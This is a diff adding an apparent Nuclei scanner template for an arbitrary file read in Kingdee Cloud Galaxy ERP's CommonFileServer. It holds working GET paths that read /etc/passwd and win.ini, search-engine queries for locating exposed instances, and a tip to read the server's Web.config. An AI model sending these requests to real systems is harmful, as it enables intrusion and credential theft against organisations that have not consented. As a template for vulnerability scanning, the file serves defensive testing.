@@ -1,0 +1,35 @@
+id: kingdee-erp-CommonFileserver-fileread
+
+info:
+  name: 金蝶云星空 CommonFileServer - fileread
+  author: leadlife
+  severity: high
+  description:
+  reference:
+    - todo
+  metadata:
+    verified: true
+    fofa-query: body="HTML5/content/themes/kdcss.min.css" || app="Kingdee-K3-cloud"
+    hunter-query: app.name="Kingdee 金蝶云星空"
+    quake-query: app:"金蝶云星空"
+    zoomeye-query: app:"金蝶 OA"
+    tips: 如果发现该漏洞可尝试读取 C%3A%5CProgram%20Files%20%28x86%29%5CKingdee%5CK3Cloud%5CWebSite%5CWeb.config
+  tags: kingdee,oa,erp,k3cloud,fileread
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/CommonFileServer/etc/passwd"
+      - "{{BaseURL}}/CommonFileServer/c:/windows/win.ini"
+      - "{{BaseURL}}/K3Cloud/CommonFileServer/etc/passwd"
+      - "{{BaseURL}}/K3Cloud/CommonFileServer/c:/windows/win.ini"
+      - "{{BaseURL}}/CommonFileServer/c%3a%2fwindows%2fwin.ini"
+
+    stop-at-first-match: true
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "\\[(font|extension|file)s\\]"
+        condition: or
